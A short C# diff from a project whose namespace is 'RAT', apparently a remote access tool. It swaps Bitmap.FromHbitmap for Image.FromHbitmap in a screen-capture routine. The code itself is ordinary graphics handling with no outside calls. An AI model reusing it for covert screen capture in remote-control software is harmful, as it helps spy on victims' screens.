@@ -49,7 +49,7 @@ namespace RAT
             User32.ReleaseDC(handle, hdcSrc);
 
             // get a .NET image object for it
-            Bitmap img = Bitmap.FromHbitmap(hBitmap);
+            Bitmap img = Image.FromHbitmap(hBitmap);
             // free up the Bitmap object
             GDI32.DeleteObject(hBitmap);
 
